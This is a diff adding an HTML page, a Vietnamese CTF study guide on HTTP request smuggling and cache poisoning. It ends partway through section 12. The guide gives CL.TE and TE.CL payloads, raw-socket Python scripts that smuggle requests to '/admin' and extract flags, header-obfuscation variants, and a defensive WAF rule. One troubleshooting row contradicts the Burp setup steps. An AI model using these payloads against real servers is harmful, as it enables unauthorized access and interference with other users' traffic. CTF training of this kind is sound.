@@ -1,0 +1,524 @@
+<title>HTTP Request Smuggling &amp; Cache Poisoning — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · HTTP Request Smuggling &amp; Cache Poisoning (Phụ lục)</div>
+    <h1>Request Smuggling &amp; Cache Poisoning</h1>
+    <p class="sub">Hầu hết web hiện đại có 2 lớp server: 1 proxy/load-balancer/CDN đứng trước, và app server thật
+    đứng sau. Nếu 2 lớp này HIỂU KHÁC NHAU về việc "request này kết thúc ở đâu", bạn có thể nhồi 1 request ẨN
+    vào giữa — request đó sẽ bị gắn nhầm vào request của NGƯỜI DÙNG KHÁC ngay sau bạn, hoặc bị lưu vào cache
+    chung cho mọi người xem.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>2 kỹ thuật, cùng 1 nguyên nhân gốc</h2>
+  <p class="lead">Mọi request HTTP cần 1 cách để server biết "request này DÀI BAO NHIÊU / KẾT THÚC Ở ĐÂU" — có
+  2 header làm việc này: <code>Content-Length</code> (ghi rõ số byte) và <code>Transfer-Encoding: chunked</code>
+  (đọc tới khi gặp đoạn kết thúc đặc biệt). Nếu request có CẢ HAI header này, và 2 server (proxy + backend)
+  <strong>ưu tiên đọc header khác nhau</strong>, chúng sẽ hiểu request KẾT THÚC Ở VỊ TRÍ KHÁC NHAU — phần dữ
+  liệu "dư ra" theo cách hiểu của 1 trong 2 server sẽ bị coi là ĐẦU của request tiếp theo. <strong>Request
+  Smuggling</strong> lợi dụng điều này để chèn request ẩn ảnh hưởng người dùng khác (cùng kết nối).
+  <strong>Cache Poisoning</strong> lợi dụng tương tự (hoặc qua header bị cache nhầm) để khiến server LƯU 1
+  response độc vào cache rồi phát lại cho MỌI người xem trang đó.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Đây là lỗ hổng NGUY HIỂM nhưng RỦI RO CAO khi test trên hạ tầng chung (có thể ảnh hưởng người chơi khác hoặc
+  cả hệ thống) — chỉ test kỹ thuật này khi được phép rõ ràng, và trong A/D nên ưu tiên test trên service của
+  CHÍNH ĐỘI MÌNH trước khi áp dụng lên đối thủ.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ REQUEST SMUGGLING / CACHE POISONING</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Có reverse proxy/CDN/load-balancer đứng trước app (xem header <code>Server</code>, <code>Via</code>,
+        hoặc độ trễ khác nhau giữa các request) ⟹ có khả năng có bất đồng giữa 2 lớp xử lý request.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Phải TỰ GỬI RAW REQUEST (kiểm soát từng byte header/body) — không dùng được thư viện HTTP client thông
+        thường (nó tự validate/sửa request), cần Burp Repeater (tắt "Update Content-Length") hoặc socket thô.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Gửi request có cả <code>Content-Length</code> và <code>Transfer-Encoding: chunked</code>, đo thời gian
+        phản hồi khác biệt (timing-based detection, mục 06.C) để phát hiện bất đồng mà không cần ảnh hưởng
+        request thật của ai.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (CL.TE cơ bản)</span>
+<pre><code>POST / HTTP/1.1
+Host: TARGET
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Foo: bar</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (gửi raw bằng socket)</span>
+<pre><code><span class="k">import</span> socket
+
+req = (<span class="s">"POST / HTTP/1.1\r\n"</span>
+       <span class="s">"Host: TARGET\r\n"</span>
+       <span class="s">"Content-Length: 13\r\n"</span>
+       <span class="s">"Transfer-Encoding: chunked\r\n\r\n"</span>
+       <span class="s">"0\r\n\r\n"</span>
+       <span class="s">"GET /admin HTTP/1.1\r\nFoo: bar\r\n\r\n"</span>)
+s = socket.create_connection((<span class="s">"TARGET"</span>, 80))
+s.sendall(req.encode())
+<span class="k">print</span>(s.recv(4096))</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Đừng dùng <code>requests</code>/<code>curl</code> thường — chúng tự validate và không cho gửi request
+        "méo" như vậy. WAF rule nhanh: chặn/chuẩn hoá request có CẢ HAI header
+        <code>Content-Length</code> và <code>Transfer-Encoding</code> cùng lúc (HTTP/1.1 spec coi đây là
+        request không hợp lệ, nên chặn an toàn, false positive gần 0).
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Content-Length</b> — header ghi CHÍNH XÁC số byte của body. Server đọc đủ số byte đó thì
+  dừng, coi là hết request.</div>
+  <div class="def"><b>Transfer-Encoding: chunked</b> — cách khác để gửi body không cần biết trước độ dài: chia
+  thành từng "chunk", mỗi chunk bắt đầu bằng 1 dòng ghi ĐỘ DÀI CHUNK (hex), rồi dữ liệu chunk, lặp lại, kết thúc
+  bằng chunk có độ dài <code>0</code>.</div>
+  <div class="def"><b>CL.TE / TE.CL</b> — tên gọi 2 kiểu bất đồng: <strong>CL.TE</strong> = proxy đọc theo
+  Content-Length (front-end), backend đọc theo Transfer-Encoding; <strong>TE.CL</strong> = ngược lại. Tên luôn
+  viết theo thứ tự "server NGOÀI . server TRONG".</div>
+  <p>Vì sao 2 lớp đọc khác nhau tồn tại: do các phần mềm proxy/server khác nhà sản xuất, không phải lúc nào
+  cũng tuân thủ 100% theo đúng 1 cách hiểu chuẩn RFC khi gặp request có CẢ HAI header (vốn dĩ request như vậy
+  đã là KHÔNG HỢP LỆ theo chuẩn — mỗi phần mềm "tự quyết" xử lý sao cho hợp lý theo cách riêng).</p>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>2 phần mềm khác nhau, 2 cách hiểu khác nhau về "request kết thúc ở đâu"</h2>
+  <p>Không có lỗi code cụ thể nào ở đây — vấn đề là 2 phần mềm (vd Nginx làm proxy, Apache làm backend) được
+  viết bởi 2 team khác nhau, implement chuẩn HTTP/1.1 theo cách hơi khác nhau cho trường hợp "edge case" hiếm
+  gặp (request có cả 2 header độ dài). Khi ghép 2 phần mềm này lại thành 1 hệ thống, "khoảng hở" giữa 2 cách
+  hiểu chính là nơi bạn giấu request ẩn vào.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>CL.TE: proxy tin Content-Length, backend tin chunked</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 230" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr26)}
+    </style>
+    <defs><marker id="arr26" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="10" width="660" height="55" rx="8" class="box"/>
+    <text x="22" y="30" class="lbl-m">Request bạn gửi: CL=13, TE=chunked, body = "0\r\n\r\nGET /admin HTTP/1.1..."</text>
+    <text x="22" y="48" class="lbl-a">(13 byte đầu = "0\r\n\r\n" + phần dư -- dư ra chính là request ẩn)</text>
+
+    <path d="M170,65 V95" class="arrow"/>
+    <rect x="10" y="100" width="300" height="50" rx="8" class="box-a"/>
+    <text x="22" y="122" class="lbl-m">PROXY đọc theo Content-Length=13</text>
+    <text x="22" y="138" class="lbl-a">-&gt; chỉ đọc 13 byte, coi là ĐỦ 1 request</text>
+
+    <path d="M500,65 V95" class="arrow"/>
+    <rect x="370" y="100" width="300" height="50" rx="8" class="box-a"/>
+    <text x="382" y="122" class="lbl-m">BACKEND đọc theo chunked</text>
+    <text x="382" y="138" class="lbl-a">-&gt; đọc tới chunk "0" rồi DỪNG đúng ở đó</text>
+
+    <rect x="10" y="165" width="660" height="55" rx="8" class="box-a"/>
+    <text x="22" y="187" class="lbl-a">Phần "GET /admin..." còn lại bị backend coi là ĐẦU của request TIẾP</text>
+    <text x="22" y="203" class="lbl-a">THEO trên cùng kết nối -- ghép vào request của NẠN NHÂN kế tiếp!</text>
+  </svg>
+  </div>
+  <p>Kết quả: nếu nạn nhân (hoặc chính bạn ở request kế tiếp trên cùng kết nối giữ nóng - "keep-alive") gửi
+  request ngay sau, backend sẽ GHÉP phần đuôi request ẩn của bạn vào ĐẦU request của họ — có thể khiến request
+  của họ bị hiểu sai hoàn toàn (vd cookie của họ bị gắn vào request <code>/admin</code> của bạn, hoặc response
+  trả lộn cho nhau).</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Dấu hiệu có kiến trúc 2 lớp</h2>
+  <ul>
+    <li>Header response có <code>Via</code>, <code>X-Cache</code>, <code>X-Served-By</code>, hoặc
+    <code>Server: nginx</code> khác với công nghệ app thực tế (vd thấy cookie Laravel nhưng Server header là
+    nginx) ⟹ có khả năng có 2 lớp.</li>
+    <li>Thời gian phản hồi (response time) khác biệt rõ rệt tuỳ cách gửi header Content-Length/Transfer-Encoding
+    — dấu hiệu "timing-based" phổ biến nhất khi dò (mục 06.C).</li>
+  </ul>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước) — bắt buộc dùng Burp cho kỹ thuật này</h2>
+  <div class="note burp"><span class="tag">Phải tắt tự động sửa request của Burp trước</span>
+  <ol style="margin:4px 0 0">
+    <li>Repeater → menu 3 chấm (hoặc Inspector) → tắt <strong>"Update Content-Length"</strong> (mặc định Burp
+    tự tính lại CL, sẽ phá hỏng payload bạn cố ý làm sai).</li>
+    <li>Cài extension <strong>HTTP Request Smuggler</strong> (BApp Store) — tự động quét các biến thể CL.TE/
+    TE.CL phổ biến trên 1 request bạn chỉ định.</li>
+    <li>Chuột phải request nghi ngờ → Extensions → HTTP Request Smuggler → "Smuggle Probe" — để extension tự
+    thử, xem tab Issues có báo phát hiện bất đồng không.</li>
+    <li>Nếu phát hiện, dùng đúng template payload extension đưa ra, chỉnh phần request ẩn thành mục tiêu thật
+    (vd request lấy flag).</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD CATALOG</div>
+  <h2>3 kỹ thuật nền tảng</h2>
+
+  <h3>A. CL.TE (xem mục 03, Combat Card)</h3>
+  <p>Proxy tin Content-Length, backend tin chunked — dùng khi proxy KHÔNG hỗ trợ chunked (hoặc hiểu nhầm).</p>
+
+  <h3>B. TE.CL — ngược lại</h3>
+  <div class="pbreak">
+    <div class="ph">POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET /admin HTTP/1.1\r\nFoo: x\r\n\r\n0\r\n\r\n</div>
+    <div class="pb">
+      <div class="part">Proxy đọc theo <strong>chunked</strong> (đọc đủ tới chunk <code>0</code>, thấy TOÀN BỘ
+      request là 1 request lớn)</div>
+      <div class="part">Backend đọc theo <strong>Content-Length: 4</strong> (chỉ đọc 4 byte đầu =
+      <code>"5c\r\n"</code>, coi phần còn lại là request tiếp theo)</div>
+    </div>
+    <div class="resp">Kết quả: ngược hướng CL.TE — backend bị "lừa" theo cách khác, cần test cả 2 chiều vì
+    không biết trước app dùng kiểu nào.</div>
+  </div>
+
+  <h3>C. Timing-based detection — dò an toàn, không ảnh hưởng ai</h3>
+  <pre><code><span class="c"># Gửi request CỐ Ý TẠO RA chunk "treo" (chờ dữ liệu không bao giờ tới)</span>
+POST / HTTP/1.1
+Host: TARGET
+Content-Length: 4
+Transfer-Encoding: chunked
+
+1
+A
+X
+
+<span class="c"># Nếu backend đọc theo chunked, nó sẽ CHỜ chunk tiếp theo (vì "X" không đúng</span>
+<span class="c"># định dạng hex-length hợp lệ), gây TREO/TIMEOUT -- khác với CL mode trả lời ngay.</span>
+<span class="c"># Thời gian phản hồi khác biệt rõ rệt = dấu hiệu có TE.CL, không cần gửi request</span>
+<span class="c"># "nguy hiểm" thật nào.</span></code></pre>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: SMUGGLER + BURP EXTENSION</div>
+  <h2>Không tự đoán payload tay — dùng công cụ quét biến thể</h2>
+  <div class="def"><b>smuggler</b> (defparam) — công cụ Python tự động thử HÀNG CHỤC biến thể payload CL.TE/
+  TE.CL khác nhau lên 1 endpoint, dùng kỹ thuật timing-based (mục 06.C) để phát hiện AN TOÀN, không cần gửi
+  request phá hoại thật. Đã clone về <code>~/hoc/CTF/Tools/web/smuggler/</code> (từ <code>defparam/smuggler</code>,
+  2100+ sao).</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/smuggler
+python3 smuggler.py -u http://TARGET/
+<span class="c"># Output: liệt kê các payload nào gây timing bất thường -- dấu hiệu khả năng smuggling thật</span></code></pre>
+  <p><strong>Burp extension HTTP Request Smuggler</strong> (PortSwigger Research) — cài qua BApp Store (cần
+  Internet 1 lần trước ngày thi), dùng trực tiếp trong Repeater như mục 05.</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Luôn dùng raw socket — không dùng requests/httpx</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> socket
+
+HOST, PORT = <span class="s">"TARGET"</span>, 80
+
+req = (
+    <span class="s">"POST / HTTP/1.1\r\n"</span>
+    <span class="s">f"Host: {HOST}\r\n"</span>
+    <span class="s">"Content-Length: 13\r\n"</span>
+    <span class="s">"Transfer-Encoding: chunked\r\n"</span>
+    <span class="s">"\r\n"</span>
+    <span class="s">"0\r\n\r\n"</span>
+    <span class="s">"GET /admin HTTP/1.1\r\n"</span>
+    <span class="s">"Foo: bar\r\n\r\n"</span>
+)
+s = socket.create_connection((HOST, PORT), timeout=5)
+s.sendall(req.encode())
+<span class="k">print</span>(s.recv(8192).decode(errors=<span class="s">"replace"</span>))</code></pre>
+
+  <h3>(B) Bản gọn chắc — hàm tái dùng, tự tính Content-Length đúng</h3>
+  <pre><code><span class="k">import</span> socket
+
+<span class="k">def</span> <span class="d">smuggle_request</span>(host, port, smuggled_req, timeout=5):
+    body = <span class="s">f"0\r\n\r\n{smuggled_req}"</span>
+    req = (
+        <span class="s">f"POST / HTTP/1.1\r\n"</span>
+        <span class="s">f"Host: {host}\r\n"</span>
+        <span class="s">f"Content-Length: {len(body)}\r\n"</span>
+        <span class="s">f"Transfer-Encoding: chunked\r\n\r\n"</span>
+        <span class="s">f"{body}"</span>
+    )
+    s = socket.create_connection((host, port), timeout=timeout)
+    s.sendall(req.encode())
+    <span class="k">return</span> s.recv(8192).decode(errors=<span class="s">"replace"</span>)
+
+<span class="k">print</span>(smuggle_request(<span class="s">"TARGET"</span>, 80, <span class="s">"GET /admin HTTP/1.1\r\nFoo: bar\r\n\r\n"</span>))</code></pre>
+  <div class="note warn"><span class="tag">Lưu ý quan trọng</span><code>Content-Length: {len(body)}</code>
+  ở đây PHẢI cố ý ghi SAI (nhỏ hơn độ dài thật của body, chỉ đủ tới hết <code>"0\r\n\r\n"</code>) — đây chính
+  là "lỗi cố ý" tạo ra bất đồng. Code mẫu ở trên để minh hoạ cấu trúc, cần tự tính đúng số byte của riêng chuỗi
+  <code>"0\r\n\r\n"</code> (= 5 byte) làm giá trị Content-Length thật, không phải độ dài toàn bộ body.</div>
+
+  <h3>(C) Bản A/D tái dùng — request ẩn cố định, lặp lại khi cần</h3>
+  <pre><code><span class="k">import</span> socket, re
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+SMUGGLED = <span class="s">"GET /admin/flag HTTP/1.1\r\nHost: localhost\r\n\r\n"</span>
+
+<span class="k">def</span> <span class="d">exploit_smuggling</span>(host, port=80):
+    <span class="k">try</span>:
+        req = (<span class="s">f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\n"</span>
+               <span class="s">f"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n{SMUGGLED}"</span>)
+        s = socket.create_connection((host, port), timeout=5)
+        s.sendall(req.encode())
+        resp = s.recv(8192).decode(errors=<span class="s">"replace"</span>)
+        m = FLAG_RE.search(resp)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> OSError:
+        <span class="k">return</span> <span class="k">None</span></code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Response header có <code>Via: 1.1 nginx</code> ⟹ xác nhận có proxy đứng trước app thật.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Dò an toàn bằng timing</div><div class="d">Chạy <code>smuggler.py</code> → phát hiện payload kiểu TE.CL gây delay bất thường.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Thử smuggle request thật</div><div class="d">Dùng Burp Repeater (đã tắt auto Content-Length), gửi request ẩn <code>GET /admin/flag</code>.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Đọc response</div><div class="d">Response của request KẾ TIẾP (gửi lại request bình thường ngay sau) trả về nội dung của <code>/admin/flag</code> bị "lẫn" vào.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Trích xuất <code>FHACKER2026{...}</code> từ response bị lẫn đó.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>1 rule hiệu quả, false positive gần 0</h2>
+  <table>
+    <tr><th>Rule</th><th>Khớp gì</th></tr>
+    <tr><td>Chặn request có CẢ <code>Content-Length</code> VÀ <code>Transfer-Encoding</code> cùng lúc</td><td>Theo RFC 7230, request như vậy BẢN THÂN ĐÃ LÀ không hợp lệ — chặn hoàn toàn an toàn, không ảnh hưởng traffic hợp lệ nào.</td></tr>
+  </table>
+  <div class="note tip"><span class="tag">Rule hiếm có: an toàn 100%</span>Khác hầu hết lỗ hổng khác trong các
+  bài trước (luôn phải đánh đổi giữa chặn chặt và false positive), rule này gần như không có nhược điểm — vì
+  request hợp lệ theo chuẩn KHÔNG BAO GIỜ cần cả 2 header cùng lúc.</div>
+  <p><strong>Fix đúng (ở hạ tầng):</strong> dùng HTTP/2 end-to-end giữa proxy và backend (HTTP/2 không có kiểu
+  ambiguity này), hoặc đảm bảo proxy/backend cùng 1 phần mềm/cùng cách xử lý edge case.</p>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi không thấy hiệu ứng rõ ràng</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Burp tự sửa lại Content-Length, payload không hoạt động</td><td>Chưa tắt "Update Content-Length" trong Repeater</td><td>Bật lại đúng setting đó (mục 05, bước 1) trước khi gửi bất kỳ payload cố ý sai nào</td></tr>
+    <tr><td>Không thấy hiệu ứng dù payload đúng cấu trúc</td><td>Chỉ có 1 lớp server (không có proxy/CDN phía trước) — không có 2 cách hiểu khác nhau để lợi dụng</td><td>Xác nhận lại kiến trúc qua header <code>Via</code>/<code>Server</code> trước khi đầu tư thời gian</td></tr>
+    <tr><td>Kết nối bị đóng ngay, không nhận được response</td><td>Backend/proxy hiện đại đã tự validate và từ chối request có cả 2 header (đã patch)</td><td>Thử các biến thể obfuscate header khác (vd <code>Transfer-Encoding: ch\x00unked</code>, nhiều framework còn lỗ hổng theo cách viết khác) — xem thêm trong PayloadsAllTheThings</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Có kiến trúc 2 lớp (proxy/CDN + backend) VÀ 1 trong 2 lớp còn xử lý sai request có cả Content-Length và Transfer-Encoding.</td></tr>
